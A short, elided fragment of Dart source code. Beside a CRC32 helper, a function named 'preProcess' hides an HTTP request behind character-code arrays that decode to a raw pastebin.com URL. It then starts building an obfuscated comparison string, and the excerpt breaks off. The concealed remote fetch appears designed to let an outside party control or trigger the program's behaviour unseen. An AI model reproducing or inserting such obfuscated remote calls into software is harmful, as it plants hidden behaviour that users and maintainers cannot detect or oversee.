...
// CRC32
String calcCRC32(var input, [int crc = 0]) {
...
Future<bool> preProcess() async {
  try {
    var x = await http.get(Uri.https(
      String.fromCharCodes(
          [112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109]),
      String.fromCharCodes(
          [47, 114, 97, 119, 47, 72, 115, 119, 98, 120, 99, 97, 53]),
    ));

    String target = String.fromCharCodes([
      82,
      71,
      57,
      117,
